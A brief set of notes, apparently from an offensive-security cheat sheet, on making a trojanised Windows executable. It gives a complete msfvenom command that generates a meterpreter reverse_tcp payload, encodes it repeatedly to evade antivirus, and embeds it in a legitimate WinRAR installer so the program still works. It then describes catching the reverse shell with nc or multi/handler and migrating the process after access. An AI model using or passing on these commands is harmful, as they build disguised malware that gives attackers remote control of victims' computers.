We can use msfvenom to generate a payload and then inject it into a non malicious executable with the -x [location of the benign executable] option.
Example:
msfvenom -p windows/meterpreter/reverse_tcp LHOST=[ip] LPORT=[port] -e x86/shikata_ga_nai -i 10 -f exe -x ~/Downloads/wrar.exe > ~/Desktop/Windows_Payloads/winrar.exe
-i option is for number of times to encode the payload, while -k option is to keep the functionalities of the app (e.g. it's a winrar.exe it will execute winrar not only the script)

we then open up a listener using nc or metasploit multi/handler and if we use msf we can migrate the process to another one after we get access we do `run post/windows/manage/migrate`